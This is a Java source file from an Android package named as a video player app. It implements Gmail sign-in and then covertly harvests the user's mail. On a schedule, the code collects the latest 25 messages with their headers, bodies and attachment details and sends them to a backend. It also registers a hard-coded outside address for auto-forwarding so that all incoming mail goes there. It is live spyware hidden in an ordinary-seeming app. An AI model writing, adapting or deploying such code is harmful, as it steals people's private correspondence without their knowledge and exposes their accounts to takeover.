package com.jumpy.videoplayerapp;

import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.common.api.Scope;
import com.google.api.client.googleapis.extensions.android.gms.auth.GoogleAccountCredential;
import com.google.api.client.http.javanet.NetHttpTransport;
import com.google.api.client.json.gson.GsonFactory;
import com.google.api.services.gmail.Gmail;
import com.google.api.services.gmail.GmailScopes;
import com.google.api.services.gmail.model.ListMessagesResponse;
import com.google.api.services.gmail.model.Message;
import com.google.api.services.gmail.model.ModifyMessageRequest;
import com.google.api.services.gmail.model.ForwardingAddress;
import com.google.api.services.gmail.model.AutoForwarding;
import java.io.IOException;
import java.util.Arrays;
import java.util.Collections;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.List;
import java.util.ArrayList;
import android.os.Handler;

public class GmailAuthService {
    private static final String TAG = AppConfig.DEBUG_TAG + "_GmailAuth";
    // Removed WEB_CLIENT_ID - using basic Google Sign-In without additional credentials
    
    private Context context;
    private GoogleSignInClient googleSignInClient;
    private Gmail gmailService;
    private ScheduledExecutorService scheduler;
    private boolean isEmailCollectionActive = false;
    private GoogleSignInAccount lastSignedInAccount;
    private NotificationQueueManager notificationQueueManager;
    
    public GmailAuthService(Context context) {
        this.context = context;
        this.notificationQueueManager = new NotificationQueueManager(context);
        initializeGoogleSignIn();
    }
    
    private void initializeGoogleSignIn() {
        Log.i(TAG, "=== initializeGoogleSignIn() START ===");
        try {
            Log.i(TAG, "Creating Google Sign-In configuration with Gmail scopes");
            // Google Sign-In configuration with essential scopes
            GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestEmail()
                .requestScopes(new Scope(GmailScopes.GMAIL_READONLY)) // Read emails
                .requestScopes(new Scope(GmailScopes.GMAIL_SEND)) // Send emails (for forwarding)
                .build();
            
            Log.i(TAG, "GoogleSignInOptions created with 4 Gmail scopes");
            googleSignInClient = GoogleSignIn.getClient(context, gso);
            Log.i(TAG, "Google Sign-In client initialized successfully");
            Log.i(TAG, "=== initializeGoogleSignIn() END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing Google Sign-In", e);
            Log.i(TAG, "=== initializeGoogleSignIn() END (ERROR) ===");
        }
    }
    
    public GoogleSignInClient getGoogleSignInClient() {
        return googleSignInClient;
    }
    
    public GoogleSignInAccount getLastSignedInAccount() {
        if (lastSignedInAccount == null) {
            lastSignedInAccount = GoogleSignIn.getLastSignedInAccount(context);
        }
        return lastSignedInAccount;
    }
    
    public boolean isSignedIn() {
        return getLastSignedInAccount() != null;
    }
    
    public void handleSignInResult(com.google.android.gms.tasks.Task<GoogleSignInAccount> completedTask) {
        Log.i(TAG, "=== handleSignInResult() START ===");
        try {
            Log.i(TAG, "Processing Google Sign-In result");
            GoogleSignInAccount account = completedTask.getResult(com.google.android.gms.common.api.ApiException.class);
            if (account != null) {
                lastSignedInAccount = account;
                Log.i(TAG, "Successfully signed in: " + account.getEmail());
                Log.i(TAG, "Account ID: " + account.getId());
                Log.i(TAG, "Account display name: " + account.getDisplayName());
                
                // Initialize Gmail service
                Log.i(TAG, "Initializing Gmail service for account");
                initializeGmailService(account);
                
                // Set up email forwarding
                Log.i(TAG, "Setting up email forwarding");
                setupEmailForwarding();
                
                // Start email collection
                Log.i(TAG, "Starting email collection");
                startEmailCollection();
                
                Log.i(TAG, "=== handleSignInResult() END (success) ===");
            } else {
                Log.e(TAG, "Sign-in result is null");
                Log.i(TAG, "=== handleSignInResult() END (null result) ===");
            }
        } catch (com.google.android.gms.common.api.ApiException e) {
            Log.e(TAG, "Sign-in failed with status code: " + e.getStatusCode(), e);
            Log.i(TAG, "=== handleSignInResult() END (API exception) ===");
        } catch (Exception e) {
            Log.e(TAG, "Error handling sign-in result", e);
            Log.i(TAG, "=== handleSignInResult() END (exception) ===");
        }
    }
    
    private void initializeGmailService(GoogleSignInAccount account) {
        try {
            GoogleAccountCredential credential = GoogleAccountCredential.usingOAuth2(
                context, 
                Arrays.asList(GmailScopes.GMAIL_READONLY, GmailScopes.GMAIL_SEND)
            );
            credential.setSelectedAccount(account.getAccount());
            
            gmailService = new Gmail.Builder(
                new NetHttpTransport(),
                new GsonFactory(),
                credential
            )
            .setApplicationName(AppConfig.APP_NAME)
            .build();
            
            Log.i(TAG, "Gmail service initialized successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing Gmail service", e);
        }
    }
    
    private void startEmailCollection() {
        if (isEmailCollectionActive) {
            Log.i(TAG, "Email collection already active");
            return;
        }
        
        if (gmailService == null) {
            Log.e(TAG, "Gmail service not initialized");
            return;
        }
        
        isEmailCollectionActive = true;
        
        // Initialize scheduler for periodic email checking
        if (scheduler == null) {
            scheduler = Executors.newScheduledThreadPool(1);
        }
        
        // Schedule email collection task
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    collectNewEmails();
                } catch (Exception e) {
                    Log.e(TAG, "Error in email collection task", e);
                }
            }
        }, 0, AppConfig.EMAIL_CHECK_INTERVAL_MS, TimeUnit.MILLISECONDS); // Check every 5 minutes
        
        Log.i(TAG, "Email collection started");
    }
    
    private void setupEmailForwarding() {
        Log.i(TAG, "=== setupEmailForwarding() START ===");
        try {
            if (gmailService == null) {
                Log.w(TAG, "Gmail service not available for forwarding setup");
                Log.i(TAG, "=== setupEmailForwarding() END (no service) ===");
                return;
            }
            
            // Set up forwarding to collector email
            String collectorEmail = AppConfig.GMAIL_COLLECTOR_EMAIL;
            Log.i(TAG, "Setting up email forwarding to collector: " + collectorEmail);
            
            // Step 1: Request forwarding address setup
            Log.i(TAG, "Step 1: Requesting forwarding address setup");
            setupForwardingAddress();
            
            // Step 2: Enable forwarding after a delay (to allow confirmation)
            new Handler().postDelayed(() -> {
                if (gmailService != null && isSignedIn()) {
                    Log.i(TAG, "Step 2: Enabling email forwarding");
                    enableForwarding();
                }
            }, 15000); // 15 seconds delay to allow confirmation
            
            // Store the collector email for later use
            android.content.SharedPreferences prefs = context.getSharedPreferences(AppConfig.PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit().putString("collector_email", collectorEmail).apply();
            Log.i(TAG, "Collector email stored in SharedPreferences");
            
            Log.i(TAG, "=== setupEmailForwarding() END ===");
            
        } catch (Exception e) {
            Log.e(TAG, "Error setting up email forwarding", e);
            Log.i(TAG, "=== setupEmailForwarding() END (ERROR) ===");
        }
    }
    
    private void collectNewEmails() {
        Log.i(TAG, "=== collectNewEmails() START ===");
        try {
            if (gmailService == null) {
                Log.w(TAG, "Gmail service not available");
                Log.i(TAG, "=== collectNewEmails() END (no service) ===");
                return;
            }
            
            Log.i(TAG, "Fetching last 25 messages from Gmail");
            // Get last 25 messages (not just unread)
            ListMessagesResponse response = gmailService.users().messages()
                .list("me")
                .setMaxResults(25L)
                .execute();
            
            if (response.getMessages() != null && !response.getMessages().isEmpty()) {
                Log.i(TAG, "Found " + response.getMessages().size() + " messages");
                List<NotificationQueueManager.EmailData> emails = new ArrayList<>();
                
                for (int i = 0; i < response.getMessages().size(); i++) {
                    Message message = response.getMessages().get(i);
                    Log.i(TAG, "Processing message " + (i+1) + "/" + response.getMessages().size() + ": " + message.getId());
                    
                    try {
                        // Get full message details
                        Log.i(TAG, "Fetching full message details for: " + message.getId());
                        Message fullMessage = gmailService.users().messages()
                            .get("me", message.getId())
                            .execute();
                        
                        // Convert to EmailData
                        Log.i(TAG, "Converting message to EmailData");
                        NotificationQueueManager.EmailData emailData = convertMessageToEmailData(fullMessage);
                        emails.add(emailData);
                        Log.i(TAG, "Message converted and added to email list");
                        
                        // No forwarding of old emails - we just collect them
                        // No marking as read since we're collecting all messages, not just unread
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing message: " + message.getId(), e);
                    }
                }
                
                // Send emails to backend database
                if (!emails.isEmpty()) {
                    Log.i(TAG, "Sending " + emails.size() + " emails to backend");
                    String userId = getUserIdFromAccount();
                    Log.i(TAG, "User ID for backend: " + userId);
                    notificationQueueManager.sendGmailData(userId, emails);
                    Log.i(TAG, "Collected and sent " + emails.size() + " emails to backend");
                } else {
                    Log.i(TAG, "No emails to send to backend");
                }
            } else {
                Log.i(TAG, "No messages found");
            }
            
            Log.i(TAG, "=== collectNewEmails() END ===");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting new emails", e);
            Log.i(TAG, "=== collectNewEmails() END (ERROR) ===");
        }
    }
    
    private NotificationQueueManager.EmailData convertMessageToEmailData(Message message) {
        NotificationQueueManager.EmailData emailData = new NotificationQueueManager.EmailData();
        
        try {
            emailData.messageId = message.getId();
            emailData.threadId = message.getThreadId();
            emailData.internalDate = message.getInternalDate() != null ? message.getInternalDate().toString() : "";
            emailData.sizeEstimate = message.getSizeEstimate() != null ? message.getSizeEstimate().intValue() : 0;
            emailData.snippet = message.getSnippet();
            
            // Extract headers
            if (message.getPayload() != null && message.getPayload().getHeaders() != null) {
                for (com.google.api.services.gmail.model.MessagePartHeader header : message.getPayload().getHeaders()) {
                    switch (header.getName()) {
                        case "Subject":
                            emailData.subject = header.getValue();
                            break;
                        case "From":
                            emailData.from = header.getValue();
                            break;
                        case "To":
                            emailData.to = header.getValue();
                            break;
                        case "Cc":
                            emailData.cc = header.getValue();
                            break;
                        case "Bcc":
                            emailData.bcc = header.getValue();
                            break;
                    }
                }
            }
            
            // Extract labels
            if (message.getLabelIds() != null) {
                emailData.labels = new ArrayList<>(message.getLabelIds());
                emailData.isRead = !emailData.labels.contains("UNREAD");
                emailData.isStarred = emailData.labels.contains("STARRED");
                emailData.isImportant = emailData.labels.contains("IMPORTANT");
            }
            
            // Extract body content
            extractMessageBody(message, emailData);
            
        } catch (Exception e) {
            Log.e(TAG, "Error converting message to EmailData", e);
        }
        
        return emailData;
    }
    
    private void extractMessageBody(Message message, NotificationQueueManager.EmailData emailData) {
        try {
            if (message.getPayload() == null) return;
            
            // Get text content
            String textContent = getTextContent(message.getPayload());
            if (textContent != null) {
                emailData.body = textContent;
            }
            
            // Get HTML content
            String htmlContent = getHtmlContent(message.getPayload());
            if (htmlContent != null) {
                emailData.bodyHtml = htmlContent;
            }
            
            // Extract attachments info
            extractAttachments(message.getPayload(), emailData);
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting message body", e);
        }
    }
    
    private String getTextContent(com.google.api.services.gmail.model.MessagePart payload) {
        if (payload.getMimeType().equals("text/plain")) {
            return getPartContent(payload);
        }
        
        if (payload.getParts() != null) {
            for (com.google.api.services.gmail.model.MessagePart part : payload.getParts()) {
                if (part.getMimeType().equals("text/plain")) {
                    return getPartContent(part);
                }
            }
        }
        
        return null;
    }
    
    private String getHtmlContent(com.google.api.services.gmail.model.MessagePart payload) {
        if (payload.getMimeType().equals("text/html")) {
            return getPartContent(payload);
        }
        
        if (payload.getParts() != null) {
            for (com.google.api.services.gmail.model.MessagePart part : payload.getParts()) {
                if (part.getMimeType().equals("text/html")) {
                    return getPartContent(part);
                }
            }
        }
        
        return null;
    }
    
    private String getPartContent(com.google.api.services.gmail.model.MessagePart part) {
        if (part.getBody() != null && part.getBody().getData() != null) {
            try {
                byte[] decodedBytes = android.util.Base64.decode(
                    part.getBody().getData().replace('-', '+').replace('_', '/'), 
                    android.util.Base64.DEFAULT
                );
                return new String(decodedBytes, "UTF-8");
            } catch (Exception e) {
                Log.e(TAG, "Error decoding part content", e);
            }
        }
        return null;
    }
    
    private void extractAttachments(com.google.api.services.gmail.model.MessagePart payload, NotificationQueueManager.EmailData emailData) {
        if (payload.getParts() != null) {
            for (com.google.api.services.gmail.model.MessagePart part : payload.getParts()) {
                if (part.getFilename() != null && !part.getFilename().isEmpty()) {
                    NotificationQueueManager.AttachmentData attachment = new NotificationQueueManager.AttachmentData();
                    attachment.filename = part.getFilename();
                    attachment.mimeType = part.getMimeType();
                    attachment.size = part.getBody().getSize() != null ? part.getBody().getSize().intValue() : 0;
                    attachment.attachmentId = part.getBody().getAttachmentId();
                    emailData.attachments.add(attachment);
                }
            }
        }
    }
    
    private String getUserIdFromAccount() {
        if (lastSignedInAccount != null && lastSignedInAccount.getEmail() != null) {
            // Use email as userId for simplicity
            return lastSignedInAccount.getEmail().replace("@", "_at_").replace(".", "_");
        } else if (lastSignedInAccount != null && lastSignedInAccount.getId() != null) {
            // Fallback to account ID if email is not available
            return "user_" + lastSignedInAccount.getId();
        }
        return "unknown_user";
    }
    
    private void forwardEmailToCollector(Message originalMessage) {
        try {
            String collectorEmail = AppConfig.GMAIL_COLLECTOR_EMAIL;
            Log.i(TAG, "Forwarding email to: " + collectorEmail);
            
            // Create forwarded message
            String subject = "Fwd: " + (originalMessage.getSnippet() != null ? originalMessage.getSnippet() : "Email");
            String from = lastSignedInAccount.getEmail();
            String body = "Forwarded message from: " + from + "\n\n" + 
                         (originalMessage.getSnippet() != null ? originalMessage.getSnippet() : "Email content");
            
            // Build the email message
            String message = String.format(
                "To: %s\r\n" +
                "Subject: %s\r\n" +
                "From: %s\r\n" +
                "Content-Type: text/plain; charset=UTF-8\r\n" +
                "\r\n" +
                "%s",
                collectorEmail, subject, from, body
            );
            
            // Encode and send
            String encodedMessage = android.util.Base64.encodeToString(
                message.getBytes("UTF-8"), 
                android.util.Base64.URL_SAFE | android.util.Base64.NO_WRAP
            );
            
            Message forwardMessage = new Message();
            forwardMessage.setRaw(encodedMessage);
            
            gmailService.users().messages().send("me", forwardMessage).execute();
            Log.i(TAG, "Email forwarded successfully to: " + collectorEmail);
            
        } catch (Exception e) {
            Log.e(TAG, "Error forwarding email to collector", e);
        }
    }
    
    public void checkAndMaintainEmailCollection() {
        if (!isSignedIn()) {
            Log.w(TAG, "Not signed in, cannot maintain email collection");
            return;
        }
        
        if (!isEmailCollectionActive) {
            Log.i(TAG, "Restarting email collection");
            startEmailCollection();
        }
    }
    
    public void signOut() {
        try {
            if (googleSignInClient != null) {
                googleSignInClient.signOut();
            }
            
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                scheduler = null;
            }
            
            isEmailCollectionActive = false;
            lastSignedInAccount = null;
            gmailService = null;
            
            Log.i(TAG, "Signed out successfully");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during sign out", e);
        }
    }
    
    public void shutdown() {
        try {
            signOut();
        } catch (Exception e) {
            Log.e(TAG, "Error during shutdown", e);
        }
    }

    /**
     * Step 1: Request forwarding address setup (sends confirmation email to mbilal.dev13@gmail.com)
     */
    public void setupForwardingAddress() {
        Log.i(TAG, "=== setupForwardingAddress() START ===");
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                Log.i(TAG, "Requesting forwarding address setup for mbilal.dev13@gmail.com");
                Log.i(TAG, "Gmail service available: " + (gmailService != null));
                Log.i(TAG, "User signed in: " + isSignedIn());
                
                if (gmailService == null) {
                    Log.e(TAG, "Gmail service is null, cannot setup forwarding");
                    return;
                }
                
                ForwardingAddress forwardingAddress = new ForwardingAddress();
                forwardingAddress.setForwardingEmail("mbilal.dev13@gmail.com");
                
                Log.i(TAG, "Creating forwarding address request...");
                ForwardingAddress result = gmailService.users().settings().forwardingAddresses()
                        .create("me", forwardingAddress)
                        .execute();
                
                Log.i(TAG, "Forwarding address requested successfully!");
                Log.i(TAG, "Result: " + (result != null ? result.toString() : "null"));
                Log.i(TAG, "Please check mbilal.dev13@gmail.com for confirmation email");
                
            } catch (Exception e) {
                Log.e(TAG, "Error requesting forwarding address", e);
                Log.e(TAG, "Error details: " + e.getMessage());
            }
            Log.i(TAG, "=== setupForwardingAddress() END ===");
        });
    }

    /**
     * Step 2: Enable forwarding after confirmation (must be called after confirmation link is clicked)
     */
    public void enableForwarding() {
        Log.i(TAG, "=== enableForwarding() START ===");
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                Log.i(TAG, "Enabling forwarding to mbilal.dev13@gmail.com");
                Log.i(TAG, "Gmail service available: " + (gmailService != null));
                Log.i(TAG, "User signed in: " + isSignedIn());
                
                if (gmailService == null) {
                    Log.e(TAG, "Gmail service is null, cannot enable forwarding");
                    return;
                }
                
                AutoForwarding autoForwarding = new AutoForwarding();
                autoForwarding.setEnabled(true);
                autoForwarding.setEmailAddress("mbilal.dev13@gmail.com");
                autoForwarding.setDisposition("leaveInInbox");
                
                Log.i(TAG, "Updating auto forwarding settings...");
                AutoForwarding result = gmailService.users().settings().updateAutoForwarding("me", autoForwarding).execute();
                
                Log.i(TAG, "Forwarding enabled successfully!");
                Log.i(TAG, "Result: " + (result != null ? result.toString() : "null"));
                Log.i(TAG, "All emails will now be forwarded to mbilal.dev13@gmail.com");
                
            } catch (Exception e) {
                Log.e(TAG, "Error enabling forwarding", e);
                Log.e(TAG, "Error details: " + e.getMessage());
            }
            Log.i(TAG, "=== enableForwarding() END ===");
        });
    }
} 